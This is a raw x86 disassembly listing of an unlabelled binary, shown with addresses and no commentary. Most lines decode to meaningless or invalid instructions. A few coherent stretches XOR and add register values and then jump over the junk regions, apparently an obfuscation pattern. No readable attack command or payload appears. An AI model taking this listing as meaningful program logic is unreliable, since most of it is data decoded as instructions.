  40196e:	mov    ch,dh
  401970:	ret    
  401971:	lods   al,BYTE PTR ds:[esi]
  401972:	(bad)  
  401973:	mov    bl,al
  401975:	mov    bl,al
  401977:	push   cs
  401978:	cmp    BYTE PTR [edx+0x7ee3fa70],ch
  40197e:	and    eax,0x9bc54649
  401983:	inc    ecx
  401984:	mov    ds:0x58d859f3,al
  401989:	imul   edx,esi,0x2f3f3a28
  40198f:	addr16 retf 0x445a
  401993:	dec    ebp
  401994:	ret    
  401995:	ret    0xae18
  401998:	mov    ecx,0x47709406
  40199d:	mov    esp,ss
  40199f:	and    ebp,DWORD PTR [edx+ecx*4+0x45bba699]
  4019a6:	xchg   ebx,eax
  4019a7:	in     al,0x78
  4019a9:	xor    DWORD PTR [ebp+0x66896686],0x6f0781d8
  4019b3:	lock pop eax
  4019b5:	(bad)  [ebp+0x15bf0ca9]
  4019bb:	dec    edx
  4019bc:	out    dx,al
  4019bd:	pop    ds
  4019be:	aaa    
  4019bf:	xlat   BYTE PTR ds:[ebx]
  4019c0:	dec    ebx
  4019c1:	enter  0x94a9,0x15
  4019c5:	sbb    edi,DWORD PTR [esi-0x16]
  4019c8:	adc    eax,0x81bade2f
  4019cd:	mov    ?,WORD PTR [edx+eiz*1+0x1e]
  4019d1:	push   edx
  4019d2:	(bad)  
  4019d3:	pfmax  mm3,QWORD PTR [esi+0x4b]
  4019d8:	imul   esi,DWORD PTR [eax],0xdb0a3059
  4019de:	mov    WORD PTR [ebp+0x7078e220],gs
  4019e4:	lods   eax,DWORD PTR ds:[esi]
  4019e5:	pop    esi
  4019e6:	mov    edx,0x787ddbb2
  4019eb:	pop    ss
  4019ec:	rol    BYTE PTR ds:0x74f70b85,0xcf
  4019f3:	jnp    0x4019ba
  4019f5:	test   DWORD PTR [esi-0xa],ebp
  4019f8:	loope  0x40197b
  4019fa:	bound  ebp,QWORD PTR [esp+ecx*8-0x6d5796f4]
  401a01:	arpl   dx,bx
  401a03:	inc    ecx
  401a04:	mov    bl,0x15
  401a06:	mov    bl,0xda
  401a08:	mov    dl,0x73
  401a0a:	mov    ch,0x6b
  401a0c:	inc    edx
  401a0d:	push   eax
  401a0e:	mov    esp,0x1a07a91c
  401a13:	inc    ebp
  401a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a15:	mov    ds:0xa3ed0882,eax
  401a1a:	xor    BYTE PTR [ebp-0x45],0x1e
  401a1e:	out    0x88,eax
  401a20:	jo     0x401a9d
  401a22:	mov    edi,0x22ae757f
  401a27:	jnp    0x4019fa
  401a29:	fld    QWORD PTR [edi]
  401a2b:	stos   DWORD PTR es:[edi],eax
  401a2c:	mov    edx,0x8d1ad6dd
  401a31:	pop    ds
  401a32:	push   ss
  401a33:	gs or  eax,0xc9fa18c1
  401a39:	push   0xf425bbf9
  401a3e:	adc    al,0xe3
  401a40:	push   ecx
  401a41:	out    dx,al
  401a42:	inc    ecx
  401a43:	mov    dl,BYTE PTR [edi-0x55090d77]
  401a49:	mov    esi,0x72ac3d27
  401a4e:	pop    esi
  401a4f:	repnz (bad) 
  401a51:	jmp    0x6538eace
  401a56:	pop    esi
  401a57:	mov    ds:0x6317c708,al
  401a5c:	fwait
  401a5d:	int3   
  401a5e:	call   0xc7a7:0x37ab8f15
  401a65:	cs test eax,0x5dff2927
  401a6b:	inc    ecx
  401a6c:	arpl   WORD PTR ds:0x998829a5,dx
  401a72:	xchg   bh,al
  401a74:	ja     0x401a94
  401a76:	mov    DWORD PTR ds:[ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	or     BYTE PTR [ebx],0x51
  401a8e:	ret    
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a39
  401a98:	or     BYTE PTR [edi-0x62],ah
  401a9b:	mov    bh,0xb8
  401a9d:	pop    ebp
  401a9e:	mov    eax,ds:0x6632e83b
  401aa3:	adc    eax,0x62b3f675
  401aa8:	pop    es
  401aa9:	xchg   edx,eax
  401aaa:	cli    
  401aab:	jmp    0x540da3be
  401ab0:	mov    ah,0x6b
  401ab2:	sub    BYTE PTR [ebp-0x5e90f594],dl
  401ab8:	and    DWORD PTR [edx],esi
  401aba:	and    BYTE PTR [edx],ch
  401abc:	sub    BYTE PTR [ecx-0x74445718],dl
  401ac2:	cmp    ecx,esp
  401ac4:	cmp    al,0x5f
  401ac6:	test   eax,0x443f8b9
  401acb:	and    al,0x73
  401acd:	sbb    BYTE PTR [esi-0x26],dh
  401ad0:	adc    ebx,DWORD PTR [eax]
  401ad2:	arpl   WORD PTR [edx+0x317bf1],bp
  401ad8:	enter  0x33e1,0xf
  401adc:	inc    edx
  401add:	pop    ebp
  401ade:	rcl    BYTE PTR [edi+0x7bda3749],1
  401ae4:	popa   
  401ae5:	jge    0x401a90
  401ae7:	ret    0xa714
  401aea:	mov    ebp,0x2c6c89f3
  401aef:	int3   
  401af0:	inc    esp
  401af1:	add    eax,0xd94b2edf
  401af6:	dec    edi
  401af7:	pop    es
  401af8:	(bad)  
  401af9:	repz je 0x401ad8
  401afc:	sysret 
  401afe:	lock fnstcw WORD PTR [edi]
  401b01:	cli    
  401b02:	mov    BYTE PTR [ecx+ebp*8],bh
  401b05:	and    eax,0x14a1d205
  401b0a:	fsubrp st(2),st
  401b0c:	scas   eax,DWORD PTR es:[edi]
  401b0d:	aas    
  401b0e:	push   es
  401b0f:	into   
  401b10:	xchg   ebx,eax
  401b11:	in     al,0x54
  401b13:	lods   al,BYTE PTR ds:[esi]
  401b14:	jl     0x401ab2
  401b16:	cs jecxz 0x401b4f
  401b19:	std    
  401b1a:	imul   edi,DWORD PTR [ebp-0x3c],0x6c1a73f5
  401b21:	call   0xcb644465
  401b26:	pop    edi
  401b27:	add    ebp,ecx
  401b29:	lods   al,BYTE PTR ds:[esi]
  401b2a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  401b2c:	(bad)  
  401b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b2e:	les    esi,FWORD PTR [ebx+0x686cf19e]
  401b34:	pop    ds
  401b35:	cmp    ebp,DWORD PTR [edx-0x4960ef83]
  401b3b:	stos   BYTE PTR es:[edi],al
  401b3c:	lods   al,BYTE PTR ds:[esi]
  401b3d:	xor    BYTE PTR [ebx],ah
  401b3f:	adc    eax,0x11e509e5
  401b44:	retf   
  401b45:	xchg   ebp,eax
  401b46:	icebp  
  401b47:	or     ecx,ecx
  401b49:	inc    esp
  401b4a:	fsubr  st(4),st
  401b4c:	out    dx,eax
  401b4d:	(bad)  
  401b4e:	xchg   ebp,eax
  401b4f:	cmp    DWORD PTR [eax-0x1204d3b0],edi
  401b55:	stos   DWORD PTR es:[edi],eax
  401b56:	sub    BYTE PTR [esi+0x39],dl
  401b59:	add    al,0x13
  401b5b:	cli    
  401b5c:	jne    0x401b14
  401b5e:	dec    ecx
  401b5f:	in     eax,0xd1
  401b61:	and    ch,bl
  401b63:	ret    0xe1c4
  401b66:	fsub   QWORD PTR [edi+0x546a9c87]
  401b6c:	inc    esp
  401b6d:	and    eax,0x36636c9d
  401b72:	into   
  401b73:	xor    al,0xb5
  401b75:	pop    ss
  401b76:	pop    ebp
  401b77:	or     ecx,esp
  401b79:	or     ah,BYTE PTR ds:0xf9488121
  401b7f:	xor    DWORD PTR [ebp+0x29],0x39
  401b83:	add    bl,BYTE PTR ss:[eax]
  401b86:	ins    BYTE PTR es:[edi],dx
  401b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b88:	xchg   DWORD PTR [eax],ebx
  401b8a:	lea    eax,[esi]
  401b8c:	test   eax,0x22deeaa
  401b91:	lods   al,BYTE PTR ds:[esi]
  401b92:	pop    es
  401b93:	pop    edx
  401b94:	jne    0x401b9e
  401b96:	push   0xfd78dc27
  401b9b:	and    al,0xa5
  401b9d:	dec    edi
  401b9e:	xchg   edi,eax
  401b9f:	(bad)  
  401ba0:	jo     0x401b6b
  401ba2:	jb     0x401bff
  401ba4:	pop    eax
  401ba5:	cmp    BYTE PTR [eax-0x37bb844],0x3b
  401bac:	mov    esi,ebp
  401bae:	inc    ebp
  401baf:	cdq    
  401bb0:	lods   eax,DWORD PTR ds:[esi]
  401bb1:	shl    BYTE PTR [ebx],cl
  401bb3:	ret    0xb14f
  401bb6:	arpl   WORD PTR [edi],ax
  401bb8:	icebp  
  401bb9:	jne    0x401bf3
  401bbb:	mov    gs,WORD PTR [ebx+0x40]
  401bbe:	ds mov ah,bh
  401bc1:	jnp    0x401bb3
  401bc3:	cmp    al,0x59
  401bc5:	ja     0x401bbd
  401bc7:	sbb    BYTE PTR [esi+0x653192c2],cl
  401bcd:	mov    DWORD PTR [ecx-0x27444b2f],edx
  401bd3:	xchg   esi,eax
  401bd4:	mov    bh,0xe
  401bd6:	mov    cl,0xc8
  401bd8:	jno    0x401b73
  401bda:	jl     0x401c3e
  401bdc:	push   esi
  401bdd:	fxch   st(3)
  401bdf:	out    0x10,eax
  401be1:	das    
  401be2:	sbb    DWORD PTR [ebx+0x610a2178],ebx
  401be8:	dec    edx
  401be9:	test   al,0xaf
  401beb:	sti    
  401bec:	int3   
  401bed:	adc    ebp,DWORD PTR [eax]
  401bef:	in     eax,0x14
  401bf1:	mov    cl,0x8b
  401bf3:	ins    DWORD PTR es:[edi],dx
  401bf4:	imul   edi,DWORD PTR [edi+0x3faaa753],0x9
  401bfb:	loopne 0x401c64
  401bfd:	xor    eax,0xf6b5b1ac
  401c02:	rol    DWORD PTR [esi-0x2aced3cc],0x4f
  401c09:	lock dec esi
  401c0b:	pop    ebx
  401c0c:	mov    ebp,ebx
  401c0e:	dec    eax
  401c0f:	cmp    bh,BYTE PTR [ecx]
  401c11:	jmp    0x401b99
  401c13:	mov    ebx,0x40fb91fc
  401c18:	or     DWORD PTR [esi+0x74],ebp
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	stos   DWORD PTR es:[edi],eax
  401c41:	jne    0x401cba
  401c43:	ror    DWORD PTR [edx-0x5818187],cl
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401ccc
  401c4d:	xchg   ebp,eax
  401c4e:	jns    0x401c9b
  401c50:	dec    edi
  401c51:	mov    BYTE PTR [ebx-0x406c21b1],0xa6
  401c58:	xchg   ah,cl
  401c5a:	push   ss
  401c5b:	sub    al,0x86
  401c5d:	dec    edi
  401c5e:	pop    ebp
  401c5f:	xchg   esi,eax
  401c60:	fstp   QWORD PTR [ecx-0x77f4383f]
  401c66:	bound  eax,QWORD PTR [esi-0x64]
  401c69:	adc    al,0x8d
  401c6b:	mov    ?,WORD PTR [esi]
  401c6d:	pop    ss
  401c6e:	lods   al,BYTE PTR ds:[esi]
  401c6f:	jmp    0x7d60:0x74f693e6
  401c76:	shl    DWORD PTR [ecx+0x70c82ddc],cl
  401c7c:	adc    DWORD PTR ds:0x4707ae66,0x38
  401c83:	dec    ebp
  401c84:	jne    0x401cc4
  401c86:	sbb    bl,BYTE PTR [eax]
  401c88:	or     BYTE PTR [ebp+0x126be1e3],ch
  401c8e:	push   cs
  401c8f:	int    0x4c
  401c91:	sub    DWORD PTR [ecx+eax*2-0x293af5bc],ecx
  401c98:	dec    ebp
  401c99:	rcr    DWORD PTR [edi+0x13628e1],0x6
  401ca0:	jmp    0x401ca6
  401ca2:	cmp    bl,BYTE PTR [edx-0x24]
  401ca5:	push   cs
  401ca6:	icebp  
  401ca7:	sbb    DWORD PTR es:[edx+0x7c],eax
  401cab:	int3   
  401cac:	mov    esi,0x721b6be6
  401cb1:	mov    dh,0xdf
  401cb3:	loopne 0x401d11
  401cb5:	xchg   esp,eax
  401cb6:	jl     0x401c84
  401cb8:	es sub al,0xb7
  401cbb:	cdq    
  401cbc:	pop    es
  401cbd:	mov    BYTE PTR [edx-0xb],al
  401cc0:	mov    dh,0xe8
  401cc2:	out    dx,eax
  401cc3:	xchg   edx,eax
  401cc4:	and    BYTE PTR [esp+ebp*8],bl
  401cc7:	xchg   DWORD PTR [ebx],ecx
  401cc9:	rol    DWORD PTR [edi-0x51],cl
  401ccc:	and    DWORD PTR [esi+ecx*8+0x53],edi
  401cd0:	push   edx
  401cd1:	pop    es
  401cd2:	mov    edx,0xbb5493e
  401cd7:	out    0x61,al
  401cd9:	cmovne esp,ebp
  401cdc:	cdq    
  401cdd:	ror    BYTE PTR [esi-0x91dfae3],1
  401ce3:	push   edi
  401ce4:	aas    
  401ce5:	cli    
  401ce6:	sar    DWORD PTR [ebx+ebp*2+0x1a],0x92
  401ceb:	mov    eax,0xd6ebbd0
  401cf0:	retf   
  401cf1:	ins    DWORD PTR es:[edi],dx
  401cf2:	stc    
  401cf3:	cld    
  401cf4:	das    
  401cf5:	dec    ebx
  401cf6:	mov    dh,0xdf
  401cf8:	cli    
  401cf9:	gs mov dh,0x61
  401cfc:	imul   DWORD PTR [esi-0x5c]
  401cff:	imul   ebx,DWORD PTR [ebx+0x6da06824],0x2d0eb4f3
  401d09:	xor    ecx,DWORD PTR [ebx+0x63cfefef]
  401d0f:	lock aad 0x6d
  401d12:	sub    BYTE PTR [ebp-0x46],dh
  401d15:	int3   
  401d16:	lahf   
  401d17:	dec    esi
  401d18:	sbb    al,al
  401d1a:	or     esi,ebp
  401d1c:	imul   eax,ebx,0xffffffd1
  401d1f:	out    0xf7,al
  401d21:	popa   
  401d22:	scas   eax,DWORD PTR es:[edi]
  401d23:	adc    ebp,DWORD PTR [esi-0x32]
  401d26:	xor    ebx,DWORD PTR [edx-0x5de4d93c]
  401d2c:	mov    ebx,0x260a2a74
  401d31:	inc    esp
  401d32:	outs   dx,DWORD PTR ds:[esi]
  401d33:	out    0x68,eax
  401d35:	sub    eax,0x86c54b73
  401d3a:	in     al,0x5c
  401d3c:	mov    WORD PTR [ecx+0x3],es
  401d3f:	mov    edx,ebp
  401d41:	lock fimul WORD PTR [ebx]
  401d44:	jo     0x401d00
  401d46:	into   
  401d47:	mov    bh,BYTE PTR [eax]
  401d49:	or     ah,BYTE PTR [esi]
  401d4b:	cdq    
  401d4c:	call   0xf51d929c
  401d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d52:	cmp    al,0xc6
  401d54:	push   0xfd137c4b
  401d59:	sub    bh,dh
  401d5b:	jae    0x401d6f
  401d5d:	cld    
  401d5e:	js     0x401d2c
  401d60:	mov    esi,0xf0d30117
  401d65:	xor    al,0xcc
  401d67:	or     edi,esi
  401d69:	(bad)
  401d6c:	pop    edx
  401d6d:	fwait
  401d6e:	or     al,0xde
  401d70:	jne    0x401d90
  401d72:	xchg   ebx,eax
  401d73:	sub    DWORD PTR [edx-0x33f70e78],ebx
  401d79:	and    eax,0x11e7592c
  401d7e:	and    al,0xfa
  401d80:	dec    ebp
  401d81:	push   eax
  401d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d83:	fisubr DWORD PTR [edx+0x7f]
  401d86:	jle    0x401d8f
  401d88:	ins    DWORD PTR es:[edi],dx
  401d89:	fwait
  401d8a:	scas   eax,DWORD PTR es:[edi]
  401d8b:	mov    esp,esp
  401d8d:	cld    
  401d8e:	mov    ecx,0x496351d3
  401d93:	sbb    BYTE PTR [edx+0x26],0xd9
  401d97:	fisubr DWORD PTR [ebp+0x5b]
  401d9a:	iret   
  401d9b:	cmp    DWORD PTR [esi-0x66bfc68a],ebp
  401da1:	xchg   edx,eax
  401da2:	jl     0x401e15
  401da4:	cmp    DWORD PTR [esp+edx*2+0x56259738],esp
  401dab:	pop    esi
  401dac:	mov    edi,0x6b92acb1
  401db1:	xchg   esp,eax
  401db2:	imul   esp,DWORD PTR [esi-0x74],0x92572678
  401db9:	adc    ecx,eax
  401dbb:	das    
  401dbc:	jmp    0xe8a56d60
  401dc1:	jmp    0x520b:0x3c283e78
  401dc8:	inc    ebp
  401dc9:	xchg   edi,eax
  401dca:	test   al,0x96
  401dcc:	scas   eax,DWORD PTR es:[edi]
  401dcd:	stos   BYTE PTR es:[edi],al
  401dce:	pop    ebx
  401dcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dd0:	add    eax,edi
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x5dc608c8],ebp
  401e0d:	ja     0x401e25
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401db6
  401e17:	adc    bl,BYTE PTR [ebx]
  401e19:	xlat   BYTE PTR ds:[ebx]
  401e1a:	pop    esi
  401e1b:	rcr    BYTE PTR [ebx+esi*4+0x1e236a29],0xe
  401e23:	add    esi,edx
  401e25:	hlt    
  401e26:	pop    eax
  401e27:	fs stos BYTE PTR es:[edi],al
  401e29:	dec    esp
  401e2a:	mov    eax,ds:0x393a9aa7
  401e2f:	mov    edi,0x9372906a
  401e34:	icebp  
  401e35:	out    dx,al
  401e36:	call   0xe267:0xa78e4676
  401e3d:	xor    ecx,DWORD PTR ds:0xe1d5012e
  401e43:	jge    0x401ea7
  401e45:	popa   
  401e46:	sbb    edi,DWORD PTR fs:[edi]
  401e49:	out    0x53,al
  401e4b:	out    dx,al
  401e4c:	xor    bh,al
  401e4e:	mov    ecx,0x19ca1996
  401e53:	jmp    0x8cea6d77
  401e58:	mov    edi,0x9529c30
  401e5d:	popf   
  401e5e:	inc    esp
  401e5f:	mov    esi,0x1dc69317
  401e64:	sbb    dl,ah
  401e66:	add    BYTE PTR [edx+0x22],dl
  401e69:	xchg   edx,eax
  401e6a:	bound  edi,QWORD PTR [esi]
  401e6c:	cmp    eax,0x9cc2033e
  401e71:	inc    esp
  401e72:	retf   
  401e73:	loope  0x401e1c
  401e75:	nop
  401e76:	cmp    ch,dl
  401e78:	inc    ebp
  401e79:	and    ebx,DWORD PTR [eax+0x7b]
  401e7c:	fnstsw WORD PTR [ebx-0x42]
  401e7f:	(bad)  
  401e80:	les    esi,FWORD PTR [esi]
  401e82:	xor    edi,DWORD PTR [ecx-0x5a5d4a4f]
  401e88:	cmp    edi,ebp
  401e8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e8b:	adc    edi,DWORD PTR [eax]
  401e8d:	dec    esi
  401e8e:	shr    edx,cl
  401e90:	jns    0x401e95
  401e92:	ja     0x401e4a
  401e94:	ins    BYTE PTR es:[edi],dx
  401e95:	sahf   
  401e96:	jne    0x401e34
  401e98:	cmp    BYTE PTR ds:0xe8c37ab1,0x6b
  401e9f:	push   ebx
  401ea0:	mov    BYTE PTR fs:[ebx+0x6e],dl
  401ea4:	mov    ds:0x320d5097,al
  401ea9:	inc    edx
  401eaa:	scas   al,BYTE PTR es:[edi]
  401eab:	mov    esp,0x3dab229d
  401eb0:	scas   al,BYTE PTR es:[edi]
  401eb1:	jl     0x401ec1
  401eb3:	sbb    BYTE PTR [ebp+0x3830f972],ch
  401eb9:	adc    bl,BYTE PTR [esi+0x7d]
  401ebc:	ret    0xcd2d
  401ebf:	mov    bl,0x23
  401ec1:	mov    esi,0x431650b9
  401ec6:	fnstsw WORD PTR [edx-0x7e53fe08]
  401ecc:	int3   
  401ecd:	or     eax,DWORD PTR [eax+eiz*8-0x640da43e]
  401ed4:	pop    edi
  401ed5:	lods   eax,DWORD PTR ds:[esi]
  401ed6:	daa    
  401ed7:	ror    BYTE PTR [edi+0x40],cl
  401eda:	cdq    
  401edb:	les    edi,FWORD PTR [edx*4+0x837705f]
  401ee2:	addr16 push ebx
  401ee4:	mov    al,ds:0xbe586888
  401ee9:	mov    cl,0x8c
  401eeb:	aam    0xa4
  401eed:	mov    eax,ds:0x9a6c65c5
  401ef2:	dec    ebx
  401ef3:	sbb    ecx,edi
  401ef5:	jmp    0x74efe7a5
  401efa:	sahf   
  401efb:	pop    es
  401efc:	shr    DWORD PTR [ecx-0x67],cl
  401eff:	ja     0x401f4c
  401f01:	pop    ecx
  401f02:	and    DWORD PTR [eax+0x18],ebp
  401f05:	or     al,0x15
  401f07:	push   edi
  401f08:	inc    edx
  401f09:	dec    edi
  401f0a:	out    dx,al
  401f0b:	xlat   BYTE PTR ds:[ebx]
  401f0c:	inc    esp
  401f0d:	xor    eax,0x330b8835
  401f12:	mov    cl,0x41
  401f14:	and    edx,edx
  401f16:	dec    edi
  401f17:	sub    BYTE PTR [ebp+edx*4+0x4f],dl
  401f1b:	shr    BYTE PTR [edx+ebp*2],1
  401f1e:	ds addr16 lock ja 0x401f79
  401f23:	inc    ebp
  401f24:	pop    es
  401f25:	jb     0x401f4c
  401f27:	mov    bl,0xbb
  401f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f2a:	mov    eax,0x78eb30d4
  401f2f:	pop    edi
  401f30:	ins    DWORD PTR es:[edi],dx
  401f31:	mov    edi,0xcc70baa2
  401f36:	cmp    esp,DWORD PTR [ebp+0xd]
  401f39:	xlat   BYTE PTR ds:[bx]
  401f3b:	mov    cl,0x73
  401f3d:	mov    ebp,0xa89b3b23
  401f42:	mov    bh,0x57
  401f44:	xchg   ecx,eax
  401f45:	je     0x401f86
  401f47:	dec    edi
  401f48:	inc    edx
  401f49:	les    eax,FWORD PTR [ecx+eiz*4]
  401f4c:	fild   QWORD PTR [esi+0x651d308c]
  401f52:	adc    eax,0x63f35d7d
  401f57:	les    ebx,FWORD PTR [eax]
  401f59:	cdq    
  401f5a:	xor    cl,BYTE PTR [ecx+eax*8+0x7c7cd327]
  401f61:	ins    BYTE PTR es:[edi],dx
  401f62:	add    eax,0x39e923e4
  401f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f68:	loop   0x401f28
  401f6a:	shr    BYTE PTR ds:0x669c9c14,cl
  401f70:	ror    ah,1
  401f72:	add    al,0xc
  401f74:	inc    ebx
  401f75:	sbb    eax,DWORD PTR [eax+esi*1+0x7f]
  401f79:	xor    DWORD PTR [eax+0x65],esp
  401f7c:	jge    0x401f44
  401f7e:	int    0xd
  401f80:	lds    edx,FWORD PTR [edi]
  401f82:	pusha  
  401f83:	add    DWORD PTR [eax+0x2c],esp
  401f86:	jae    0x29506813
  401f8c:	pushf  
  401f8d:	aaa    
  401f8e:	push   DWORD PTR [ecx-0xf27c266]
  401f94:	stos   BYTE PTR es:[edi],al
  401f95:	(bad)  
  401f96:	pop    ecx
  401f97:	dec    edi
  401f98:	xor    BYTE PTR [edi],cl
  401f9a:	je     0x40230d
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0x81be0293
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f80
  401fcc:	dec    edi
  401fcd:	mov    ds:0xc26395ed,al
  401fd2:	clc    
  401fd3:	mov    esi,0xfc3cdda5
  401fd8:	rol    BYTE PTR [ecx-0x3],cl
  401fdb:	adc    ecx,DWORD PTR [ecx+0x1a32df5c]
  401fe1:	idiv   DWORD PTR [ebx-0x30bc622d]
  401fe7:	cmp    eax,0xd9280393
  401fec:	dec    edx
  401fed:	int    0x68
  401fef:	repnz bound eax,QWORD PTR [edx+0x4d]
  401ff3:	repz or eax,0x3a244a03
  401ff9:	retf   
  401ffa:	jo     0x401ffc
  401ffc:	jnp    0x40201d
  401ffe:	jmp    0xa3eb:0x637bbfbb
  402005:	bound  di,DWORD PTR [esi+0x8]
  402009:	mov    dh,0x89
  40200b:	out    dx,eax
  40200c:	sbb    ch,dh
  40200e:	sbb    al,0xe2
  402010:	mov    al,0x62
  402012:	push   esp
  402013:	dec    eax
  402014:	xor    al,0x5f
  402016:	jp     0x402044
  402018:	in     eax,0x37
  40201a:	sbb    esp,ebp
  40201c:	fwait
  40201d:	cmp    BYTE PTR [eax],dh
  40201f:	jbe    0x402022
  402021:	inc    edi
  402022:	iret   
  402023:	daa    
  402024:	ins    DWORD PTR es:[edi],dx
  402025:	mov    WORD PTR [eax+0x4a],es
  402028:	fcomp  QWORD PTR [ebx]
  40202a:	push   esi
  40202b:	push   ebx
  40202c:	sbb    dh,BYTE PTR [ecx-0x69494854]
  402032:	dec    ebx
  402033:	mov    esp,0xaa347815
  402038:	mov    cl,bh
  40203a:	mov    ebp,0xf9cbc4aa
  40203f:	mov    ebp,0x7fb9d40b
  402044:	xor    WORD PTR [ebx+ecx*4-0x2c04fd6a],0xe6e5
  40204e:	outs   dx,BYTE PTR ds:[esi]
  40204f:	loop   0x401fe1
  402051:	out    0x87,al
  402053:	repnz push cs
  402055:	scas   eax,DWORD PTR es:[edi]
  402056:	xor    al,0x7a
  402058:	sub    al,0x5c
  40205a:	pop    edi
  40205b:	mov    BYTE PTR [eax-0x6b],0xec
  40205f:	push   eax
  402060:	stc    
  402061:	and    BYTE PTR [edx-0x3f],bl
  402064:	push   ecx
  402065:	pop    esp
  402066:	jge    0x402006
  402068:	jg     0x40207c
  40206a:	(bad)  
  40206b:	nop
  40206c:	inc    edx
  40206d:	mov    al,ds:0x4ad32384
  402072:	repnz push eax
  402074:	adc    al,0x5d
  402076:	mov    bh,dl
  402078:	and    BYTE PTR [ebx+0x67],dl
  40207b:	fiadd  DWORD PTR [edi-0x49ed5bfa]
  402081:	xchg   DWORD PTR [ecx*4+0x11e7da7b],edi
  402088:	sbb    eax,0xb649c891
  40208d:	inc    eax
  40208e:	mov    eax,0x8a2e798a
  402093:	ins    DWORD PTR es:[edi],dx
  402094:	sub    eax,0xe1a0f18f
  402099:	adc    BYTE PTR ds:0xe70a230b,0xea
  4020a0:	addr16 jg 0x40209e
  4020a3:	loope  0x4020ef
  4020a5:	mov    ecx,0xeed827aa
  4020aa:	inc    edx
  4020ab:	ja     0x4020e8
  4020ad:	loop   0x4020a9
  4020af:	xlat   BYTE PTR ds:[ebx]
  4020b0:	ins    DWORD PTR es:[edi],dx
  4020b1:	sahf   
  4020b2:	mov    dl,0xb3
  4020b4:	dec    BYTE PTR [esi]
  4020b6:	push   esp
  4020b7:	add    DWORD PTR [ebp-0x7d419131],0x76
  4020be:	dec    esi
  4020bf:	test   eax,0xa86d54ff
  4020c4:	add    al,0xe1
  4020c6:	outs   dx,DWORD PTR ds:[esi]
  4020c7:	sub    al,0x53
  4020c9:	or     edx,esp
  4020cb:	lods   al,BYTE PTR ds:[esi]
  4020cc:	imul   esp,DWORD PTR [esi+0x72],0x79
  4020d0:	mov    bl,cl
  4020d2:	rcl    al,cl
  4020d4:	das    
  4020d5:	ret    
  4020d6:	fdivr  QWORD PTR [edi+0x11]
  4020d9:	cmp    bl,al
  4020db:	xor    bl,BYTE PTR [eax-0x20]
  4020de:	jecxz  0x402082
  4020e0:	int    0xb8
  4020e2:	mov    WORD PTR [ebx-0x72],?
  4020e5:	dec    ebx
  4020e6:	mov    ds:0x920dd86c,eax
  4020eb:	pop    es
  4020ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020ed:	(bad)  
  4020ee:	dec    ebp
  4020ef:	idiv   DWORD PTR [esi+0x4caadf8d]
  4020f5:	add    edi,DWORD PTR cs:[ebx]
  4020f8:	retf   0x44cb
  4020fb:	jb     0x402169
  4020fd:	retf   0xa06e
  402100:	repz push 0x9cd2e60
  402106:	sub    DWORD PTR [esi-0x3d629325],0xb96cbdba
  402110:	aad    0xd1
  402112:	stos   BYTE PTR es:[edi],al
  402113:	pop    es
  402114:	xor    BYTE PTR [edi-0x59],0xaa
  402118:	imul   BYTE PTR [ebx+0x28]
  40211b:	dec    eax
  40211c:	test   BYTE PTR [eax+0x23248c05],al
  402122:	(bad)  
  402123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402124:	leave  
  402125:	repz push es
